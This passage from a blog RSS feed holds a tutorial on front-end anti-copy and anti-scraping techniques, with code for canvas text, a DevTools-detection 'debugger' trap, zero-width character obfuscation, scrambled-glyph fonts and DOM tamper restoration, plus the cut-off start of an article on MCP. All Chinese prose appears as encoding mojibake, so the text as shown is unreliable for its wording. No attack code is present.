  <span class="hljs-keyword">const</span> ctx = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'myCanvas'</span>).<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
  ctx.<span class="hljs-property">font</span> = <span class="hljs-string">'20px Arial'</span>;
  ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'è¿™æ®µæ–‡å­—æ— æ³•å¤åˆ¶'</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>ä¸åˆ©äº SEOã€æ— éšœç¢è®¿é—®ï¼ˆå±å¹•é˜…è¯»å™¨æ— æ³•è¯»å–ï¼‰ï¼Œä¸”åŠ è½½æ…¢ã€‚</p>
<hr/>
<h3 data-id="heading-3">4.ç”¨æˆ·æŒ‰F12å°±å‡ºå‘debugåŠŸèƒ½</h3>
<p>å½“ç”¨æˆ·æŒ‰ä¸‹F12æ—¶ï¼Œè§¦å‘debugè°ƒè¯•ï¼Œè®©ç”¨æˆ·æ— æ³•é€‰ä¸­é¡µé¢å†…å®¹ã€‚</p>
<pre><code class="hljs language-js" lang="js">&lt;script&gt;
(<span class="hljs-keyword">function</span> <span class="hljs-title function_">antiDebug</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> devOpen = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> threshold = <span class="hljs-number">100</span>;

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">check</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">debugger</span>;
    <span class="hljs-keyword">const</span> end = performance.<span class="hljs-title function_">now</span>();

    <span class="hljs-keyword">if</span> (end - start &gt; threshold) {
      <span class="hljs-keyword">if</span> (!devOpen) {
        devOpen = <span class="hljs-literal">true</span>;
        <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">'&lt;h2&gt;æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·ï¼Œè¯·å…³é—­åé‡è¯•ã€‚&lt;/h2&gt;'</span>;
        <span class="hljs-comment">// å¯é€‰ï¼šä¸ŠæŠ¥ç”¨æˆ·è¡Œä¸º</span>
        <span class="hljs-comment">// fetch('/log-devtools', { method: 'POST' });</span>
      }
    } <span class="hljs-keyword">else</span> {
      devOpen = <span class="hljs-literal">false</span>;
    }

    <span class="hljs-built_in">setTimeout</span>(check, <span class="hljs-number">1000</span>);
  }

  <span class="hljs-title function_">check</span>();
})();
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-4">5. åŠ¨æ€æ–‡æœ¬æ‹†åˆ†ä¸é‡ç»„</h3>
<p>å°†æ–‡æœ¬å†…å®¹æ‹†åˆ†æˆå¤šä¸ªDOMèŠ‚ç‚¹ï¼Œå¢åŠ å¤åˆ¶éš¾åº¦ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"protected-text"</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- æ–‡æœ¬å°†è¢«JavaScriptæ‹†åˆ†å¹¶æ’å…¥ --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> text = <span class="hljs-string">"è¿™æ˜¯ä¸€æ®µéœ€è¦ä¿æŠ¤çš„æœºå¯†å†…å®¹ï¼Œä¸èƒ½è¢«è½»æ˜“å¤åˆ¶"</span>;
  <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'protected-text'</span>);
  
  <span class="hljs-comment">// å°†æ¯ä¸ªå­—ç¬¦ç”¨spanåŒ…è£¹</span>
  text.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">char</span> =&gt;</span> {
    <span class="hljs-keyword">const</span> span = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'span'</span>);
    span.<span class="hljs-property">textContent</span> = char;
    span.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'inline-block'</span>; <span class="hljs-comment">// å¢åŠ é€‰æ‹©éš¾åº¦</span>
    container.<span class="hljs-title function_">appendChild</span>(span);
  });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>è¿›é˜¶ç‰ˆ</strong>ï¼šéšæœºæ’å…¥ä¸å¯è§å­—ç¬¦æˆ–é›¶å®½å­—ç¬¦ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">obfuscateText</span>(<span class="hljs-params">text</span>) {
  <span class="hljs-keyword">const</span> zeroWidthSpace = <span class="hljs-string">'\u200B'</span>; <span class="hljs-comment">// é›¶å®½ç©ºæ ¼</span>
  <span class="hljs-keyword">return</span> text.<span class="hljs-title function_">split</span>(<span class="hljs-string">''</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">char</span> =&gt;</span> 
    char + zeroWidthSpace.<span class="hljs-title function_">repeat</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">3</span>))
  ).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
}

<span class="hljs-keyword">const</span> originalText = <span class="hljs-string">"ä¿æŠ¤å†…å®¹"</span>;
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'text'</span>).<span class="hljs-property">textContent</span> = <span class="hljs-title function_">obfuscateText</span>(originalText);
</code></pre>
<hr/>
<h3 data-id="heading-5">6. ä½¿ç”¨CSSä¼ªå…ƒç´ æ˜¾ç¤ºå†…å®¹</h3>
<p>é€šè¿‡CSSçš„<code>::before</code>æˆ–<code>::after</code>ä¼ªå…ƒç´ æ˜¾ç¤ºæ–‡æœ¬ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.protected-content</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">"è¿™æ®µæ–‡å­—é€šè¿‡CSSç”Ÿæˆï¼Œæ— æ³•ç›´æ¥é€‰ä¸­å’Œå¤åˆ¶"</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"protected-content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-6">7. å­—ä½“åçˆ¬è™«æŠ€æœ¯</h3>
<p>ä½¿ç”¨è‡ªå®šä¹‰å­—ä½“æ–‡ä»¶ï¼Œå°†å­—ç¬¦æ˜ å°„å…³ç³»æ‰“ä¹±ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@font-face</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'custom-font.woff2'</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">'woff2'</span>);
}

<span class="hljs-selector-class">.protected-text</span> {
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'CustomFont'</span>;
}
</code></pre>
<p>åœ¨å­—ä½“æ–‡ä»¶ä¸­ï¼Œå°†å®é™…å­—ç¬¦ä¸æ˜¾ç¤ºå­—ç¬¦çš„æ˜ å°„å…³ç³»æ‰“ä¹±ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>å­—ç¬¦<code>a</code>åœ¨å­—ä½“ä¸­å®é™…æ˜¾ç¤ºä¸º<code>b</code></li>
<li>å­—ç¬¦<code>b</code>æ˜¾ç¤ºä¸º<code>c</code>ï¼Œä»¥æ­¤ç±»æ¨</li>
</ul>
<p><strong>åç«¯é…åˆ</strong>ï¼šæœåŠ¡å™¨åŠ¨æ€ç”Ÿæˆå­—ä½“æ–‡ä»¶ï¼Œå®šæœŸæ›´æ¢æ˜ å°„å…³ç³»ã€‚</p>
<hr/>
<h3 data-id="heading-7">8.  Canvas + WebGL æ¸²æŸ“æ–‡æœ¬</h3>
<p>ä½¿ç”¨æ›´å¤æ‚çš„å›¾å½¢æ¸²æŸ“æŠ€æœ¯ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"textCanvas"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"800"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'textCanvas'</span>);
  <span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">'2d'</span>);
  
  <span class="hljs-comment">// è®¾ç½®æ–‡å­—æ ·å¼</span>
  ctx.<span class="hljs-property">font</span> = <span class="hljs-string">'24px Arial'</span>;
  ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">'#333'</span>;
  
  <span class="hljs-comment">// ç»˜åˆ¶å¹²æ‰°å…ƒç´ </span>
  ctx.<span class="hljs-title function_">fillText</span>(<span class="hljs-string">'ä¿æŠ¤å†…å®¹'</span>, <span class="hljs-number">50</span>, <span class="hljs-number">50</span>);
  
  <span class="hljs-comment">// æ·»åŠ å™ªå£°å¹²æ‰°</span>
  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {
    ctx.<span class="hljs-title function_">fillRect</span>(
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">800</span>, 
      <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span>, 
      <span class="hljs-number">1</span>, <span class="hljs-number">1</span>
    );
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">9. SVG æ–‡æœ¬æ¸²æŸ“</h3>
<p>ä½¿ç”¨SVGæ¸²æŸ“æ–‡æœ¬ï¼Œå¢åŠ é€‰æ‹©éš¾åº¦ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"10"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"30"</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">"Arial"</span> <span class="hljs-attr">font-size</span>=<span class="hljs-string">"20"</span> 
        <span class="hljs-attr">fill</span>=<span class="hljs-string">"black"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"user-select: none;"</span>&gt;</span>
    è¿™æ®µSVGæ–‡æœ¬éš¾ä»¥å¤åˆ¶
  <span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- æ·»åŠ å¹²æ‰°è·¯å¾„ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">path</span> <span class="hljs-attr">d</span>=<span class="hljs-string">"M10,40 L390,40"</span> <span class="hljs-attr">stroke</span>=<span class="hljs-string">"#eee"</span> <span class="hljs-attr">stroke-width</span>=<span class="hljs-string">"1"</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-9">10. å®æ—¶DOMç›‘æ§ä¸ä¿®å¤</h3>
<p>ç›‘æ§DOMå˜åŒ–ï¼Œé˜²æ­¢ç”¨æˆ·é€šè¿‡å¼€å‘è€…å·¥å…·ä¿®æ”¹å†…å®¹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> contentElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'protected-content'</span>);
<span class="hljs-keyword">const</span> originalContent = contentElement.<span class="hljs-property">innerHTML</span>;

<span class="hljs-comment">// å®šæ—¶æ£€æŸ¥å†…å®¹å®Œæ•´æ€§</span>
<span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (contentElement.<span class="hljs-property">innerHTML</span> !== originalContent) {
    contentElement.<span class="hljs-property">innerHTML</span> = originalContent;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€æµ‹åˆ°å†…å®¹ç¯¡æ”¹ï¼Œå·²æ¢å¤'</span>);
  }
}, <span class="hljs-number">500</span>);

<span class="hljs-comment">// ä½¿ç”¨MutationObserveræ›´ç²¾ç¡®çš„ç›‘æ§</span>
<span class="hljs-keyword">const</span> observer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutationObserver</span>(<span class="hljs-function">(<span class="hljs-params">mutations</span>) =&gt;</span> {
  mutations.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">mutation</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'childList'</span> || mutation.<span class="hljs-property">type</span> === <span class="hljs-string">'characterData'</span>) {
      contentElement.<span class="hljs-property">innerHTML</span> = originalContent;
    }
  });
});

observer.<span class="hljs-title function_">observe</span>(contentElement, {
  <span class="hljs-attr">childList</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">characterData</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">subtree</span>: <span class="hljs-literal">true</span>
});
</code></pre>
<hr/>
<h3 data-id="heading-10">ç»¼åˆé˜²å¾¡ç­–ç•¥å»ºè®®</h3>
<p>å¯¹äºé«˜å®‰å…¨è¦æ±‚çš„åœºæ™¯ï¼Œå»ºè®®é‡‡ç”¨<strong>åˆ†å±‚é˜²å¾¡</strong>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContentProtector</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();
  }
  
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">disableSelection</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">bindEvents</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startMonitoring</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">obfuscateContent</span>();
  }
  
  <span class="hljs-title function_">disableSelection</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">insertAdjacentHTML</span>(<span class="hljs-string">'beforeend'</span>, <span class="hljs-string">`
      &lt;style&gt;
        body { -webkit-user-select: none; user-select: none; }
        .protected { cursor: default; }
      &lt;/style&gt;
    `</span>);
  }
  
  <span class="hljs-title function_">bindEvents</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ç»‘å®šæ‰€æœ‰é˜»æ­¢äº‹ä»¶</span>
    [<span class="hljs-string">'copy'</span>, <span class="hljs-string">'cut'</span>, <span class="hljs-string">'paste'</span>, <span class="hljs-string">'contextmenu'</span>, <span class="hljs-string">'keydown'</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> {
      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(event, <span class="hljs-variable language_">this</span>.<span class="hljs-property">preventDefault</span>);
    });
  }
  
  <span class="hljs-title function_">preventDefault</span>(<span class="hljs-params">e</span>) {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
  
  <span class="hljs-title function_">startMonitoring</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å¯åŠ¨å„ç§ç›‘æ§</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">monitorDevTools</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">monitorDOMChanges</span>();
  }
  
  <span class="hljs-title function_">obfuscateContent</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å†…å®¹æ··æ·†å¤„ç†</span>
    <span class="hljs-comment">// ...</span>
  }
  
  <span class="hljs-title function_">monitorDevTools</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// å¼€å‘è€…å·¥å…·æ£€æµ‹</span>
    <span class="hljs-comment">// ...</span>
  }
  
  <span class="hljs-title function_">monitorDOMChanges</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// DOMå˜åŒ–ç›‘æ§</span>
    <span class="hljs-comment">// ...</span>
  }
}

<span class="hljs-comment">// åˆå§‹åŒ–ä¿æŠ¤</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">ContentProtector</span>();
</code></pre>
<hr/>
<h3 data-id="heading-11">æ€»ç»“</h3>
<p>è¿™äº›æ–¹æ³•åªèƒ½é˜²æ™®é€šç”¨æˆ·ï¼Œé˜²ä¸ä½çœŸæ­£æƒ³å¤åˆ¶çš„äººã€‚</p>
<p>å› ä¸ºåˆ«äººè¿˜æ˜¯å¯ä»¥é€šè¿‡çœ‹æºç ã€æˆªå›¾ã€å…³æ‰ JS ç­‰æ–¹å¼ç»•è¿‡é™åˆ¶ã€‚</p>
<p>æ‰€ä»¥å»ºè®®ï¼š</p>
<ul>
<li><strong>åˆ«è¿‡åº¦é˜²æŠ¤</strong>ï¼Œä»¥å…å½±å“æ­£å¸¸ç”¨æˆ·å’Œ SEOï¼›</li>
<li><strong>é‡è¦å†…å®¹é åç«¯æ§åˆ¶</strong>ï¼ˆæ¯”å¦‚ç™»å½•æ‰èƒ½çœ‹å…¨æ–‡ï¼‰ï¼›</li>
<li><strong>ç»„åˆä½¿ç”¨å‡ ç§æ–¹æ³•</strong>ï¼Œæé«˜é—¨æ§›å°±å¥½ï¼Œåˆ«è¿½æ±‚ç»å¯¹å®‰å…¨ã€‚</li>
</ul>
<p>æ¯•ç«Ÿå‰ç«¯å±•ç¤ºçš„å†…å®¹ï¼Œå°±é»˜è®¤æ˜¯èƒ½è¢«çœ‹åˆ°çš„ï¼Œä¹Ÿå°±èƒ½è¢«å¤åˆ¶çš„ã€‚</p>
<blockquote>
<p>æœ¬æ–‡é¦–å‘äºå…¬ä¼—å·ï¼šç¨‹åºå‘˜åˆ˜å¤§åï¼Œä¸“æ³¨åˆ†äº«å‰åç«¯å¼€å‘çš„å®æˆ˜ç¬”è®°ã€‚å…³æ³¨æˆ‘ï¼Œå°‘èµ°å¼¯è·¯ï¼Œä¸€èµ·è¿›æ­¥ï¼</p>
</blockquote>
<h4 data-id="heading-12">ğŸ“Œå¾€æœŸç²¾å½©</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6V83qjR6u0nyfzL-14xYAw" target="_blank" title="https://mp.weixin.qq.com/s/6V83qjR6u0nyfzL-14xYAw" ref="nofollow noopener noreferrer">ã€Šasync/await åˆ°åº•è¦ä¸è¦åŠ  try-catchï¼Ÿå¼‚æ­¥é”™è¯¯å¤„ç†æœ€ä½³å®è·µã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FIvdZqX7sR8DAZE8B5R5eTQ" target="_blank" title="https://mp.weixin.qq.com/s/IvdZqX7sR8DAZE8B5R5eTQ" ref="nofollow noopener noreferrer">ã€Šéƒ½åœ¨ç”¨ Java8 å’Œ Java17ï¼Œé‚£ Java9 åˆ° 16 å‘¢ï¼Ÿä»–ä»¬çœŸçš„æ²¡ç”¨å—ï¼Ÿã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fp0n2mN5RDDDaIWuHHVRUZQ" target="_blank" title="https://mp.weixin.qq.com/s/p0n2mN5RDDDaIWuHHVRUZQ" ref="nofollow noopener noreferrer">ã€ŠJava å¼€å‘å¿…çœ‹ï¼šä»€ä¹ˆæ—¶å€™ç”¨ forï¼Œä»€ä¹ˆæ—¶å€™ç”¨ Streamï¼Ÿã€‹</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FqI3TRTdDfRJSH9kCTqAQUw" target="_blank" title="https://mp.weixin.qq.com/s/qI3TRTdDfRJSH9kCTqAQUw" ref="nofollow noopener noreferrer">ã€Šè¿™ 10 ä¸ª MySQL é«˜çº§ç”¨æ³•ï¼Œè®©ä½ çš„ä»£ç åˆå¿«åˆå¥½çœ‹ã€‹</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP çˆ†ç«èƒŒåï¼šæ˜¯æŠ€æœ¯é©å‘½ï¼Œè¿˜æ˜¯ç²¾å¿ƒåŒ…è£…çš„â€œæ–°ç“¶æ—§é…’â€ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581888578507522075</link>    <guid>https://juejin.cn/post/7581888578507522075</guid>    <pubDate>2025-12-10T01:48:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507522075" data-draft-id="7580623265791901734" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP çˆ†ç«èƒŒåï¼šæ˜¯æŠ€æœ¯é©å‘½ï¼Œè¿˜æ˜¯ç²¾å¿ƒåŒ…è£…çš„â€œæ–°ç“¶æ—§é…’â€ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-10T01:48:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€æ—…äºº"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP çˆ†ç«èƒŒåï¼šæ˜¯æŠ€æœ¯é©å‘½ï¼Œè¿˜æ˜¯ç²¾å¿ƒåŒ…è£…çš„â€œæ–°ç“¶æ—§é…’â€ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€æ—…äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:48:03.000Z" title="Wed Dec 10 2025 01:48:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    70
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY